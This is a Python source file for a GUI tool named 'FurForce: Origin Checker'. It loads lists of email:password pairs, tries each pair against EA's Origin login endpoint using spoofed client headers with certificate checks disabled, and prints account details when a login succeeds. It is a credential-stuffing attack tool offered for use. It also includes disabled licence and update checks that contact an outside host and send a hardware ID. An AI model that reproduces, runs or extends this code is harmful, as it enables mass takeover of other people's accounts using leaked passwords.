# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import time
import json
from tkFileDialog import askopenfilename


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: Origin Checker')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)

        # Make Widgets
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)

        # Grid Widgets
        self.labelcombos.grid(row=0, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=0, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=1, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/spotify.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmumspot' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '1.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def origin(self, user, passw):
        global work
        work = True
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/534.34 (KHTML, like Gecko) Origin/9.2.1.4399 Safari/534.34',
            'Cookie': 'mp_super_properties=%7B%22all%22%3A%20%7B%22%24initial_referrer%22%3A%20%22http%3A//adobe.com/ap'
                      'ollo%22%2C%22%24initial_referring_domain%22%3A%20%22adobe.com%22%2C%22distinct_id%22%3A%20%22393'
                      '76314%22%7D%2C%22events%22%3A%20%7B%7D%2C%22funnels%22%3A%20%7B%7D%7D',
            'X-Origin-UID': '7743018169013447654',
            'X-Origin-Platform': 'PCWIN',
            'Referer': 'https://signin.ea.com/p/pc/login?execution=e731363257s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fscope%3Doffline%2Bbasic.identity%2Bbasic.identity.write%2Bbasic.persona%2Bopenid%2Bsignin%2Bsearch.identity%2Bbasic.entitlement%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26nonce%3D1560%26locale%3Den_US%26display%3Dorigin_client%26client_id%3DORIGIN_PC'
        }
        while work:
            try:
                login = requests.post(
                    'https://signin.ea.com/p/pc/login?execution=e731363257s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fscope%3Doffline%2Bbasic.identity%2Bbasic.identity.write%2Bbasic.persona%2Bopenid%2Bsignin%2Bsearch.identity%2Bbasic.entitlement%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26nonce%3D1560%26locale%3Den_US%26display%3Dorigin_client%26client_id%3DORIGIN_PC',
                    'email={0}&password={1}&_rememberMe=on&_loginInvisible=on&_eventId=submit&cid='.format(user, passw),
                    timeout=7.5,
                    headers=headers,
                    verify=False
                )
                scrape = requests.post(
                    'https://gateway.ea.com/proxy/identity/pids/me',
                    '',
                    timeout=7.5,
                    headers=headers,
                    verify=False,
                    cookies=login.cookies
                )
                print scrape.text
                work = False
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True
            except requests.exceptions.Timeout:
                print "Timeout Error!"
                work = True

    def start(self):
        if self.entrycombos.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with open(self.entrycombos.get(), 'r') as f:
                global userpass
                userpass = f.readlines()
                f.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as x:
            for userpasscombo in userpass:
                upass = userpasscombo.split(':')
                x.submit(self.origin, upass[0].strip(), upass[1].strip())

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()